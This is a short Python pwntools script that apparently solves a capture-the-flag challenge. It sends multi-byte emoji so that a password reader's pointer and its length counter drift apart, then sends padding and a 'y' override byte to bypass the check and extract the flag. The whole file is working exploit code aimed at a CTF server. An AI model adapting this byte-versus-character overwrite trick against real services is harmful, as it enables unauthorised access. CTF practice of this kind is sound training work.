from pwn import *
import time
import re

r = remote('c.unitedctf.ca', 10033, level='debug')

# Receive prompt
r.recvuntil(b'Enter the password:\n')

# Send two 4 byte emojis, advances readPtr by 8 but keeps length at 2
r.send('🗿🗿'.encode())

# Wait a second to make sure that both packets are handled separately, otherwise the max_length limit gets reached
time.sleep(1)

# Send two bytes of padding and the "y" override
r.send(b'__y\x00')

print(re.search(r"flag-[\w-]+", r.recvall().decode()).group(0))